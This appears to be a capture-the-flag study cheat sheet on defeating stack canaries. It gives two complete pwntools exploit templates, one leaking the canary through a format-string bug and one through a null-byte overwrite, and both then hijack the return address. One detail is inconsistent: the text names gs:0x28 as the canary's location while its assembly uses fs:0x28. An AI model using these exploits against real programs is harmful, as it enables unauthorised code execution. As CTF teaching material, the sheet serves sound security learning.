### <span style="color:rgb(255, 192, 0)">What is a Stack Canary?</span>

- In function prologue **A random value placed on the stack between the buffer and the return address**, checked before the function returns (epilogue)
- Canary usually looks like `0x7a91f3c4008e1200`, it ends with `00`
- If it's been modified → program calls `__stack_chk_fail()` → **abort**
- Set at program start, stored in `gs:0x28` (thread-local storage)
```bash
mov    rax,QWORD PTR fs:0x28          # Strong indication of a canary
mov    QWORD PTR [rbp-0x8],rax        # Canary is located at [rbp-0x8] (inspect it using x/gx $rbp-0x8)

mov    rax,QWORD PTR [rbp-0x8]
sub    rax,QWORD PTR fs:0x28
jne    ...
call   __stack_chk_fail
```

Typical stack layout **with** canary:
```
[ buffer        ]
[ padding       ]
[ CANARY        ]  ← gets checked before ret
[ saved RBP     ]
[ return address ]
```

Check if binary has canary:
```bash
checksec ./binary     # look for Stack: Canary found
```

---
### <span style="color:rgb(255, 192, 0)">The Goal:</span>
Leak the canary value  
↓  
Include it unchanged in your payload  
↓  
Overflow past it to the return address  
↓  
Redirect execution  
↓  
Get flag

-----------------------------------
### <span style="color:rgb(255, 192, 0)">Key Canary Facts</span>

| Fact                  | Detail                                                  |
| --------------------- | ------------------------------------------------------- |
| Always ends in `\x00` | Null byte stops `printf`/`puts` from leaking it naively |
| Randomized per-run    | Can't hardcode it — must leak fresh each time           |
| Same across threads   | One leak = valid for whole process                      |
| 8 bytes (64-bit)      | 4 bytes on 32-bit                                       |

---
# <span style="color:rgb(255, 192, 0)">STEP (1) Finding Offset to Canary (GDB)</span>

```bash
# 1. find offset to canary
gdb ./binary
r <<< $(pwn cyclic 200)
x/40gx $rsp        # find value ending in 00
# OR
x/gx $rbp-0x8     # easier, almost always works

# 2. find win() address
info functions     # or: p win
```

# <span style="color:rgb(255, 192, 0)">STEP (2) Pick a method</span>
### <span style="color:rgb(255, 255, 0)">Method 1 — Format String Leak</span>

If there's a `printf(buf)` vulnerability before the overflow: (`printf(buf)` instead of `printf("%s", buf)`).
Step 1: find canary's format-string index
```python
from pwn import *

p = process('./binary')

# Brute-force which argument index holds the canary
# Canary is on the stack, looks like 0x????????00 (always ends in \x00)
p.recvuntil(b"input: ")           # see whatever it prints before reading input
p.sendline(b"%p " * 20)           # leak 20 stack values
print(p.recvall())                # find the one ending in 00 - that's the canary
```

Full Exploit (hardcode the index):
```python
from pwn import *

p = process('./binary')
#p = remote('host', 1337)
win = 0xdeadbeef                 # from GDB: p win  OR  info functions

# --- Leak canary ---
p.recvuntil(b"input: ")                  # wait for binary to ask for input before sending anything
p.sendline(b"%7$p")                      # %<index>$p = leak one specific stack value by position
                                         # REPLACE 7 with whatever index you found in step 1
p.recvuntil(b"output: ")                 # wait for binary to print the leak — match whatever comes before the value
canary = int(p.recvline().strip(), 16)   # recvline() grabs the hex string, int(...,16) converts to integer
print(f"Canary: {hex(canary)}")          # sanity check — should end in 00


# --- Build payload ---
offset_to_canary = 40            # number of bytes from buffer start to where canary sits — from step 1

payload  = b"A" * offset_to_canary   # junk to reach the canary position
payload += p64(canary)               # write canary back exactly as it was — check passes, no abort
payload += b"B" * 8                  # overwrite saved RBP — we don't care what this is
payload += p64(win)                  # overwrite return address — function returns here instead

p.recvuntil(b"input: ")          # binary asks for input again — wait for it before sending payload
p.sendline(payload)
p.interactive()                  # hand control to us — type commands if we got a shell
```


### <span style="color:rgb(255, 255, 0)">Method 2 — Null Byte Overwrite Leak</span>

If the binary **prints back your buffer** (e.g. `printf(buf)` or `puts(buf)`) and there's a separate read:
Use this when there's only the buffer overflow itself, but the program **echoes your buffer back** with something null-terminated like `puts()`
- Canary's first byte is always `\x00` — this is what stops `puts()` from reading past your buffer into the canary
- Fill the buffer completely → your last byte overwrites that `\x00` → `puts()` has no null terminator to stop at, so it bleeds into the 7 remaining canary bytes and prints them
- Grab those 7 bytes, manually prepend `\x00` → you have the full 8-byte canary

Full exploit:
```python
from pwn import *

p = process('./binary')
#p = remote('host', 1337)
win = 0xdeadbeef                 # from GDB: p win  OR  info functions
offset_to_canary = 40            # from step 1 above — bytes from buffer start to canary

# --- Leak canary ---
p.recvuntil(b"input: ")               # wait for prompt before sending
p.send(b"A" * offset_to_canary)       # send() NOT sendline() — sendline() appends \n which would
                                      # land inside the canary and corrupt it before we even read it
p.recvuntil(b"A" * offset_to_canary)  # consume the echoed A's so next recv() starts right at the canary
leaked = p.recv(7)                    # canary is 8 bytes but the first \x00 was overwritten by our A's
                                      # so only 7 bytes come through — that's expected, not a bug
canary = u64(b"\x00" + leaked)        # reconstruct: glue the \x00 back onto the front
                                      # u64() reads 8 bytes little-endian — this gives us the correct integer
print(f"Canary: {hex(canary)}")       # sanity check — should end in 00

# --- Build payload ---
payload  = b"A" * offset_to_canary    # junk to reach canary
payload += p64(canary)                # restore canary exactly — if even 1 bit is wrong, program aborts
payload += b"B" * 8                   # overwrite saved RBP — junk, we don't care
payload += p64(win)                   # overwrite return address

p.recvuntil(b"input: ")          # wait for binary to ask for input again
p.sendline(payload)
p.interactive()
```



# <span style="color:rgb(255, 255, 0)">Things that go wrong</span>

| PROBLEM                      | FIX                                                                                              |
| ---------------------------- | ------------------------------------------------------------------------------------------------ |
| `stack smashing detected`    | Canary value is wrong — re-check your leak parsing, print it and verify it ends in `00`          |
| Canary only gives 7 bytes    | That's normal — the `\x00` was overwritten, prepend it back: `u64(b"\x00" + leaked)`             |
| Format string index off      | Run step 1 again, print all 20 values, carefully count position of the one ending in `00`        |
| Offset to canary wrong       | In GDB run `x/gx $rbp-0x8` while inside the function to read canary location directly            |
| `p.sendline()` corrupts leak | Method 2 step 1 must use `p.send()` — the `\n` lands in the canary and breaks everything         |
| Canary contains `\x0a`       | `fgets()` treats `\n` as end of input and cuts your payload — just re-run, it's random each time |
